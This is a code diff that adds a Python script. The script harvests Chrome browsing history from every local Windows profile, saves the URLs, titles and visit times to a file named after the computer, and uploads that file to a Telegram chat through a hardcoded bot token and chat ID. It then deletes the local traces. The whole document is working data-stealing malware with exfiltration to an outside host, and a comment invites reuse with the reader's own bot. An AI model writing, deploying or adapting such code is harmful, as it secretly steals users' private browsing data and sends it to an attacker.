@@ -1,0 +1,93 @@
+import os
+import json
+import sqlite3
+import shutil
+from datetime import timezone, datetime, timedelta
+import requests
+
+def chrome_date_and_time(chrome_data):
+    """Converts Chrome's internal timestamp to a human-readable datetime."""
+    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
+
+def send_telegram_document(document_path, caption=""):
+    """Sends the document to a Telegram channel using a bot."""
+    bot_token = "7076974857:AAH2nRGo9IN9P5g-fo19PFlc-znBfgGVzl4"  # Replace with your bot's token
+    chat_id = "-1002043772522"  # Replace with your chat ID
+    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    files = {'document': open(document_path, 'rb')}
+    payload = {"chat_id": chat_id, "caption": caption}
+    response = requests.post(url, files=files, data=payload)
+    if response.status_code != 200:
+        print(f"Failed to send document to Telegram: {response.text}")
+
+def main():
+    base_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
+
+    # Get all profiles in Chrome User Data directory, including default and others
+    profiles = [d for d in os.listdir(base_path) if d.startswith("Profile") or d == "Default"]
+    profiles.sort()  # Sort profiles for consistency
+
+    extracted_history = []
+
+    for profile_num, profile in enumerate(profiles, start=1):
+        profile_path = os.path.join(base_path, profile)
+        db_path = os.path.join(profile_path, "History")
+
+        # Skip if "History" file does not exist
+        if not os.path.exists(db_path):
+            continue
+
+        filename = f"ChromeHistory_Profile{profile_num}.db"
+        shutil.copyfile(db_path, filename)
+
+        profile_history = []
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+
+        cursor.execute(
+            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
+        )
+
+        profile_history.append(f"--- Profile {profile_num} ---\n")
+
+        for row in cursor.fetchall():
+            url = row[0]
+            title = row[1]
+            last_visit_time = row[2]
+
+            # Convert the timestamp to a human-readable datetime
+            visit_time = chrome_date_and_time(last_visit_time)
+
+            history_info = f"URL: {url}\n" \
+                           f"Title: {title}\n" \
+                           f"Last Visited: {visit_time}\n"
+            
+            profile_history.append(history_info)
+            profile_history.append("=" * 100 + "\n")
+
+        cursor.close()
+        db.close()
+
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+        if profile_history:
+            extracted_history.extend(profile_history)
+
+    if extracted_history:
+        pc_name = os.environ["COMPUTERNAME"]
+        file_path = f"chrome_history_{pc_name}.txt"
+        
+        # Use utf-8 encoding to avoid Unicode errors
+        with open(file_path, "w", encoding="utf-8") as file:
+            file.writelines(extracted_history)
+
+        send_telegram_document(file_path, caption="Chrome History from All Profiles")
+        os.remove(file_path)
+    else:
+        print("No Chrome history found.")
+
+if __name__ == "__main__":
+    main()
